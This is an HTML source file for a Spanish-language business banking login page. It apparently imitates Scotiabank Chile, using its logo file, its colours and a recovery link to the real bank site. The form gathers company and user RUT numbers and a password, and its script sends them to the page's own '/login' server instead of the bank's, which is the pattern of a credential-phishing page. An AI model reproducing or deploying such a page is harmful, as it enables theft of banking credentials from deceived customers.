<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Portal Empresa</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <!-- Bootstrap 5 -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background: #f4f4f4;
    }
    .top-bar {
      background: #fff; /* franja superior blanca */
      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
    }
    .top-bar img {
      height: 40px;
    }
    .form-card {
      background: #fff;
      padding: 2rem;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    .btn-primary {
      background-color: #d32f2f;
      border: none;
    }
    .btn-primary:hover {
      background-color: #b71c1c;
    }
    .extra-link a {
      color: #d32f2f;
      text-decoration: none;
      font-size: 0.9rem;
    }
    .extra-link a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <!-- Franja superior -->
  <nav class="top-bar navbar navbar-expand-lg fixed-top">
    <div class="container-fluid">
      <!-- Logo a la izquierda en escritorio, centrado en móvil -->
      <a class="navbar-brand mx-auto mx-lg-0" href="#">
        <img src="main/ScotiaLogo.svg" alt="Logo Empresa">
      </a>
      <!-- Contacto visible solo en escritorio -->
      <div class="d-none d-lg-block ms-auto">
        📧 contacto@empresa.cl | ☎ +56 2 1234 5678
      </div>
    </div>
  </nav>

  <!-- Contenido principal -->
  <div class="container mt-5 pt-5">
    <div class="row align-items-center">
      <!-- Formulario -->
      <div class="col-12 col-md-6 mb-4">
        <div class="form-card">
          <h2 class="text-center fw-bold mb-2">Bienvenido a su Portal Empresa</h2>
          <p class="text-center mb-4">Acceda al portal ingresando sus datos</p>
          <form id="loginForm">
            <div class="mb-3">
              <label for="rutEmpresa" class="form-label">RUT Empresa</label>
              <input type="text" class="form-control" id="rutEmpresa" name="rutEmpresa" placeholder="12.345.678-9" required>
            </div>
            <div class="mb-3">
              <label for="rutPersona" class="form-label">RUT Usuario</label>
              <input type="text" class="form-control" id="rutPersona" name="rutPersona" placeholder="98.765.432-1" required>
            </div>
            <div class="mb-3">
              <label for="passwd" class="form-label">Clave</label>
              <input type="password" class="form-control" id="passwd" name="passwd" placeholder="********" required>
            </div>
            <button type="submit" class="btn btn-primary w-100">Ingresar</button>
          </form>
          <div class="extra-link text-center mt-3">
            <a href="https://banco.scotiabank.cl/mfe-login/scotia?c=-Jm7twBoTk8r5JxsG9yQxvyBzYuj9zPzbqKzZGvVa5vWeXygMBZdA_6hy2MsHa_iNlH3e119igob0K7rFv4Y78Ed8U06fo1G887umLNUOM4#modal-recovery" target="_blank">
              Olvidó su clave / No tiene clave?
            </a>
          </div>
          <div class="message text-center mt-2" id="message"></div>
        </div>
      </div>

      <!-- Imagen -->
      <div class="col-12 col-md-6 text-center">
        <img src="aviso-ggee.jpg" alt="Aviso Empresa" class="img-fluid rounded shadow">
      </div>
    </div>
  </div>

  <!-- Bootstrap JS -->
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>

  <script>
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const rutEmpresa = document.getElementById('rutEmpresa').value;
      const rutPersona = document.getElementById('rutPersona').value;
      const passwd = document.getElementById('passwd').value;

      const res = await fetch('/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ rutEmpresa, rutPersona, passwd })
      });

      const data = await res.text();
      document.getElementById('message').textContent = data;
    });
  </script>
</body>
</html>
